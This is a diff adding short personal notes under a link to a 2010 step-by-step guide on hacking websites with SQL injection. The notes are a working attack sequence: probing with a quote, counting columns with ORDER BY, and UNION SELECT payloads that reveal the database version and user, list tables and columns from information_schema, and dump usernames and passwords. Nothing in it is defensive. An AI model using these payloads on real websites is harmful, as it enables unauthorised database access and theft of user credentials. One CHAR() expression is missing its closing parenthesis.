@@ -1,1 +1,12 @@
 http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html
+Use http://www.asciitable.com/ as an ascii table reference
+Find vulnerable webpage
+
+use ' to establish if its vulnerable
+order by 9 to determine the number of columns in the table
+union (all) select 1,2,3,4,5,6,7,8,9 to determine where the affected page displays
+union all select 1,2,3,4,@@version,6,7,8,9 to display SQL version
+union all select 1,2,3,4,user(),6,7,8,9 to determine the user for this database connection
+union all select 1,2,3,4,table_name,6,7,8,9 from information_schema.tables to show all tables in the database |{only works if user is root}
+union all select 1,2,3,4,column_name,6,7,8,9 from information_schema.columns where table_name='user' |{table_name=CHAR(117, 115, 101, 114}
+union all select 1,2,3,4,concat(username,0x3a,password),6,7,8,9 from user to display the username and passwords separated by :
